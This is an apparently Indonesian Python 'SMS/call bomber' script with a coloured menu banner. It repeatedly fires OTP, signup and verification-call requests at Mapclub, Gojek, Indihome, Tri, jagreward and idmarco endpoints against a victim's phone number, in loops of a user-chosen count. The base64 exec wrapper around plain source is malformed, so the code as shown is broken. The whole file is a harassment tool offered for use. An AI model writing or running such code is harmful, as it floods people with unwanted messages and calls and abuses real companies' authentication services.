#Fucek U
import base64
exec(base64.b64decode('import os,sys,time,subprocess,requests
from time import sleep
from requests import post

def bersih():
    os.system('clear')
def kata(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./18)
def balik():
    tod = input("\033[90m{\033[1;91m+\033[90m}\033[1;94m Coba Lagi\033[1;97m? (y/t): ")
    if tod == "y":
       os.system("python spammer.py")
    elif tod == "t":
         print ("\033[1;91mExit\033[1;97m")
         sys.exit()
    else:
         print ("\033[1;91mWrong Input!!!\033[1;97m")
         time.sleep(2)
         os.system("python spammer.py")
def banner():
    bersih()
    banner = """
\033[1;94m         ~ ~  ┌∩┐\033[1;91m(◣_◢)\033[1;94m┌∩┐  ~ ~  
\033[1;92m___  ____ ____ _  _  ____ ___  ____ _  _
\033[1;92m|  \ |__| |__/ |_/   [__  |__] |__| |\/|
\033[1;92m|__/ |  | |  \ | \_  ___] |    |  | |  |\033[1;91mV2.0
\033[1;94m===================================
\033[90mCoded\033[1;91m  :\033[1;92mFahmiApz
\033[90mYoutube\033[1;91m:\033[1;92mXmanz ID
\033[90mGithub\033[1;91m :\033[1;92mhttps://github.com/BangDanz
\033[1;94m===================================
    """
    print (banner)
def main():
    banner()
    print ("\033[1;94m[\033[1;97m+\033[1;94m]   \033[1;91mMENU    \033[1;94m[\033[1;97m+\033[1;94m]")
    print ("")
    print ("\033[90m{\033[1;94m01\033[90m}. \033[1;92mManual Spam")
    print ("\033[90m{\033[1;94m02\033[90m}. \033[1;92mBrutal 3 Spam")
    print ("\033[90m{\033[1;94m03\033[90m}. \033[1;91mExit")
    print ("\033[1;94m___________________________________")
    f = input("\033[1;97m{\033[1;91m•\033[1;97m}\033[1;94mInput\033[90m:\033[1;92m ")
    if f == "01" or f == "1":
       print ("\033[1;94m___________________________________")
       print ("\033[90m{\033[1;94m01\033[90m}.\033[1;92m Spam Mapclub")
       print ("\033[90m{\033[1;94m02\033[90m}.\033[1;92m Spam Gopay \033[90m(\033[1;93m5x\033[90m/\033[1;93m30 min\033[90m)")
       print ("\033[90m{\033[1;94m03\033[90m}.\033[1;92m Spam Indihome  \033[90m(\033[1;93mUnlimited\033[90m)")
       print ("\033[90m{\033[1;94m04\033[90m}.\033[1;92m Spam Olx")
       print ("\033[90m{\033[1;94m05\033[90m}.\033[1;92m Spam Tri")
       print ("\033[90m{\033[1;94m06\033[90m}.\033[1;92m Spam Call")
       print ("\033[90m{\033[1;94m07\033[90m}.\033[1;92m Spam Haldoc")
       print ("\033[90m{\033[1;94m08\033[90m}.\033[1;92m Spam Idmarco")
       print ("\033[90m{\033[1;94m09\033[90m}.\033[1;91m Kembali\033[90m/\033[1;91mExit")
       print ("")
       print ("")
       wo = input("\033[1;97m{\033[1;91m•\033[1;97m}\033[1;94mInput\033[90m:\033[1;92m")
       if wo == "1" or wo == "01":
          try:
              no = input("\033[1;97m{\033[1;94mMasukan Nomor\033[1;97m}:\033[1;92m")
              jl = int(input("\033[1;97m{\033[1;94mMasukan Jumlah Spam\033[1;97m}:\033[1;92m"))
          except KeyboardInterrupt:
                   print ("\033[1;91mStop!!\033[1;97m")
                   sys.exit()
          head = {
          "Connection": "keep-alive",
          "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
          }
          dot = {
          "phone": no
          }
          def kirim():
              time.sleep(1)
              r = requests.post("https://cmsapi.mapclub.com/api/signup-otp", data=dot, headers=head)
              #print ("\033[1;97m{\033[1;94mMessage\033[1;97m}:\033[1;92m", r.json()["status"])
              if "ok" in r.text:
                  print ("\033[1;97m{\033[1;92m Success\033[1;97m}")
              elif "error" in r.text:
                    print ("\033[1;97m{\033[1;91mGagal\033[1;97m}")
          
          for i in range(jl):
              try:
                  kirim()
              except requests.exceptions.ConnectionError:
                  print ("\033[1;91mTidak Ada Koneksi!!\033[1;97m")
                  sys.exit()
          balik()
       elif wo == "02" or wo == "2":
            bo = input("\033[1;97m{\033[1;94mmasukan nomor\033[1;97m}:\033[1;92m")
            il = int(input("\033[1;97m{\033[1;94mMasukan Jumlah\033[1;97m}: \033[1;92m"))
            ua = {
            "X-Session-ID": "f8b67b26-c6a4-44d2-9d86-8d93a80901c9",
            "X-Platform": "Android",
            "X-UniqueId": "8606f4e3b85968fd",
            "X-AppVersion": "3.52.2",
            "X-AppId": "com.gojek.app",
            "Accept": "application/json",
            "Authorization": "Bearer",
            "X-User-Type": "customer",
            "Accept-Language": "id-ID",
            "X-User-Locale": "id_ID",
            "Host": "api.gojekapi.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/3.12.1"
            }
            dat = {
            "email": "nsjwwiwiwisnsnn12@gmail.com",
            "name": "akuinginterbang12",
            "phone": bo,
            "signed_up_country": "ID"
            }
            for i in range(il):
                time.sleep(2)
                r = requests.post("https://api.gojekapi.com/v5/customers", data=dat, headers=ua)
                #print ("\033[90m[\033[1;92m•\033[90m]\033[1;97mStatus:\033[1;92m", r.json()["success"])
                if "True" in r.text:
                    print ("\033[1;97m{\033[1;92msuccess\033[1;97m}")
                else:
                    print ("\033[1;97m{\033[1;91mGagal\033[1;97m}")
            balik()
       elif wo == "03" or wo == "3":
            to = input("\033[1;97m{\033[1;94mMASUKAN NOMOR\033[1;97m}:\033[1;92m ")
            jum = int(input("\033[1;97m{\033[1;94mJUMLAH SPAM\033[1;97m}:\033[1;92m "))
            url = "https://sobat.indihome.co.id/ajaxreg/msisdnGetOtp"
            ua = {
            "Host": "sobat.indihome.co.id",
            "Connection": "keep-alive",
            "Accept": "*/*",
            "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            }

            dat = {
            "type":"hp",
            "msisdn": to
            }
            for i in range(jum):
                r = requests.post(url, data=dat, headers=ua)
                if "10" in r.text:
                     print ("\033[1;97m{\033[1;91mGagal\033[1;97m}")
                else:
                     print ("\033[1;97m{\033[1;92mSuccess\033[1;97m}")
            balik()
       elif wo == "4" or wo == "04":
            os.system("python2 ~/spamer/config/olx")
            balik()
       elif wo == "5" or wo == "05":
            mor = input("\033[1;97m{\033[1;94mMasukan Nomor\033[1;97m}:\033[1;92m ")
            jul = int(input("\033[1;97m{\033[1;94mJumlah Spam\033[1;97m}:\033[1;92m "))
            ad = {
            "User-Agent":"Mozilla/5.0 (Linux; U; Android 9; in-id; SM-A107F Build/PPR1.180610.011) AppleWebKit/537.16 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.16"
            }
            at = {
            "msisdn": mor
            }
            for i in range(jul):
                r = requests.post("https://registrasi.tri.co.id/daftar/generateOTP", data=at)
                if "failed" in r.text:
                    print ("\033[1;97m{\033[1;91mGagal\033[1;97m}")
                else:
                    print ("\033[1;97m{\033[1;92mSuccess\033[1;97m}")
            balik()
       elif wo == "06" or wo == "6":
            print ("\033[1;97m Salin Link Dibawah ini")
            print ("\033[1;92mhttps://id.jagreward.com/member/verify-mobile/nomor/")
            print ("\033[1;97mMasukan Nomor Pada bagian nomor")
            print ("\033[1;97mLimit 3x per 30 menit")
            print ("\033[1;94m========================================")
            wih = input ("\033[1;97m{\033[1;91m•\033[1;97m}\033[1;94mInput\033[90m:\033[1;92m")
            jh = int(input("\033[1;97m{\033[1;91m•\033[1;97m}\033[1;94mJumlah Spam\033[90m:\033[1;92m"))
            head = {
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
            "Content-Type":" application/x-www-form-urlencoded; charset=UTF-8",
            "Content-Type": "application/json",
            "Origin": "https://id.jagreward.com",
            "Referer": "https://id.jagreward.com/member/register/",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "__cfduid": "d4de1e7ea2ced09ecde54a568af1ac50b1584709816",
            "_ga": "GA1.2.2037151396.1584709855",
            "PHPSESSID": "n88pmtvvsdpf25898a9jeqbggc",
            "DAPROPS": "sjs.webGlRenderer:PowerVR Rogue GE8320|bjs.accessDom:1|bcookieSupport:1|bcss.animations:1|bcss.columns:1|bcss.transforms:1|bcss.transitions:1|sdevicePixelRatio:1.75|idisplayColorDepth:24|bflashCapable:0|bhtml.audio:1|bhtml.canvas:1|bhtml.inlinesvg:1|bhtml.svg:1|bhtml.video:1|bjs.applicationCache:1|bjs.deviceMotion:1|bjs.deviceOrientation:0|bjs.geoLocation:1|bjs.indexedDB:1|bjs.json:1|bjs.localStorage:1|bjs.modifyCss:1|bjs.modifyDom:1|bjs.querySelector:1|bjs.sessionStorage:1|bjs.supportBasicJavaScript:1|bjs.supportConsoleLog:1|bjs.supportEventListener:1|bjs.supportEvents:1|bjs.touchEvents:1|bjs.webGl:1|bjs.webSockets:1|bjs.webSqlDatabase:1|bjs.webWorkers:1|bjs.xhr:1|iorientation:0|buserMedia:1|bjs.battery:0",
            }
            bro = {
            "method": "CALL",
            "countryCode": "id",
            }
            def kirim():
                try:
                    r = requests.get(wih,data=bro, headers=head)
                    if "Anda akan menerima sebuah panggilan dari sistem kami. Silakan isi 6 ANGKA TERAKHIR dari nomor telepon dibawah ini." in r.text:
                        print ("\033[1;97m{\033[1;92mSuccess\033[1;97m}")
                    else:
                        print ("\033[1;97m{\033[1;92mGagal\033[1;97m}")
                        balik() 
                except KeyboardInterrupt:
                    print ("\033[1;91mStop!!")
            for i in range(jh):
                kirim()
                time.sleep(4)
            balik()
       elif wo == "07" or wo == "7":
            os.system("python ~/spamer/config/haldoc.py")
            balik()
       elif wo == "08" or wo == "8":
            no = input("\033[1;97m{\033[1;94mmasukan nomor\033[1;97m}:\033[1;92m")
            ju = int(input("\033[1;97m{\033[1;94mJumlah Spam\033[1;97m}:\033[1;92m"))
            ga = {
            "Host": "www.idmarco.com",
            "accept": "*/*",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36"
            }
            dat = {
            "phone": no
            }
            for i in range(ju):
                r = requests.post("https://www.idmarco.com/smsotp/login/sendotp/", data=dat, headers=ga)
                if r:
                   print ("\033[1;97m{\033[1;92mSuccess\033[1;97m}")
                else:
                   print ("\033[1;97m{\033[1;91mGagal\033[1;97m}")
            balik()
       elif wo == "09" or wo == "9":
            balik()
       else:
           print ("\033[1;91mWrong Input!!\033[1;97m")
           time.sleep(1)
           balik()
    elif f == "02" or f == "2":
         no = input("\033[1;97m{\033[1;94mMasukan Nomor\033[1;97m}:\033[1;92m")
         jim = int(input("\033[1;97m{\033[1;94mJumlah Spam\033[1;97m}:\033[1;92m"))
         def mapclub():
              head = {
              "Connection": "keep-alive",
              "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
              }
              dot = {
              "phone": no
              }
              r = requests.post("https://cmsapi.mapclub.com/api/signup-otp", data=dot, headers=head)
              #print ("\033[1;97m{\033[1;94mMessage\033[1;97m}:\033[1;92m", r.json()["status"])
              if "ok" in r.text:
                  print ("\033[1;97m{\033[1;92m Success\033[1;97m}")
              elif "error" in r.text:
                    print ("\033[1;97m{\033[1;91mGagal\033[1;97m}")
         def gopay():
              ua = {
              "X-Session-ID": "f8b67b26-c6a4-44d2-9d86-8d93a80901c9",
              "X-Platform": "Android",
              "X-UniqueId": "8606f4e3b85968fd",
              "X-AppVersion": "3.52.2",
              "X-AppId": "com.gojek.app",
              "Accept": "application/json",
              "Authorization": "Bearer",
              "X-User-Type": "customer",
              "Accept-Language": "id-ID",
              "X-User-Locale": "id_ID",
              "Host": "api.gojekapi.com",
              "Connection": "Keep-Alive",
              "Accept-Encoding": "gzip",
              "User-Agent": "okhttp/3.12.1"
              }
              dat = {
              "email": "nsjwwiwiwisnsnn12@gmail.com",
              "name": "akuinginterbang12",
              "phone": no,
              "signed_up_country": "ID"
              } 
              r = requests.post("https://api.gojekapi.com/v5/customers", data=dat, headers=ua)
                #print ("\033[90m[\033[1;92m•\033[90m]\033[1;97mStatus:\033[1;92m", r.json()["success"])
              if "True" in r.text:
                  print ("\033[1;97m{\033[1;92msuccess\033[1;97m}")
              else:
                  print ("\033[1;97m{\033[1;91mGagal\033[1;97m}")
         def indihome():
              url = "https://sobat.indihome.co.id/ajaxreg/msisdnGetOtp"
              ua = {
              "Host": "sobat.indihome.co.id",
              "Connection": "keep-alive",
              "Accept": "*/*",
              "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
              "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
              "accept-encoding": "gzip, deflate, br",
              "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
              }
 
              dat = {
              "type":"hp",
              "msisdn": no
              } 
              r = requests.post(url, data=dat, headers=ua)
              if "10" in r.text:
                  print ("\033[1;97m{\033[1;91mGagal\033[1;97m}")
              else:
                  print ("\033[1;97m{\033[1;92mSuccess\033[1;97m}")
         def id():
              ga = {
              "Host": "www.idmarco.com",
              "accept": "*/*",
              "x-requested-with": "XMLHttpRequest",
              "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36"
              }
              dat = {
              "phone": no
              } 
              r = requests.post("https://www.idmarco.com/smsotp/login/sendotp/", data=dat, headers=ga)
              if r:
                 print ("\033[1;97m{\033[1;92mSuccess\033[1;97m}")
              else:
                 print ("\033[1;97m{\033[1;91mGagal\033[1;97m}")
         for i in range(jim):
             mapclub()
             gopay()
             indihome()
             id()
         balik()
    elif f == "03" or f == "3":
         print ("\033[1;91mExit!!")
         time.sleep(2)
         sys.exit()
main()
'))
